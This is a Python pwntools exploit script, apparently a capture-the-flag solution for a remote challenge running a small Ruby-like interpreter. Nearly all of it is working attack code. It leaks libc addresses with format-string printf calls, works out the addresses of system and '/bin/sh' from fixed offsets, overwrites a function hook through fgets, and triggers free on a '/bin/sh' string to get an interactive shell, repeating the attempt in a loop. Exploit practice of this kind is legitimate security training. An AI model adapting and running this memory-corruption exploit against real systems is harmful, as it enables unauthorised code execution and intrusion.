from pwn import *
import time

context.log_level = "debug"

HOST, PORT = "chall.0ops.sjtu.edu.cn", "20202"
# HOST, PORT = '172.18.0.2', 8888
def trial():
	p = remote(HOST, PORT)
	#p = process(["./entry"])
	#f = open("./test.rb", "r").read()

	f = '''printf "%30$p %31$p %32$p %33$p
"
v = Array(10)
for i = 0, i < 4, i++
  printf "%d -> value %#x
", i, v[i]
end

# 1772152 -> real
libc = v[0] - 1936056
#libc = v[0] - 1771440
stdin = libc + 1934784
hook = libc + 1939664
system = libc + 250448
binsh = libc + 1413387

printf "libc : %#x\n", libc
printf "stdin : %#x\n", stdin
printf "system : %#x\n", system
printf "/bin/sh : %#x\n", binsh
printf "ENDEND"

printf "%10000x", 0

vv = "/bin/sh"

fgets(hook, 100, stdin)
free(vv)
'''

	p.recvuntil("rubi <xxx.rb>`.")
	p.sendline(f)
	p.sendline("EOF")
	p.recvuntil("system : ")
	system = int(p.recvuntil("\n")[:-1], 0)
	p.sendline(p32(system))
	p.interactive()

while True:
	trial()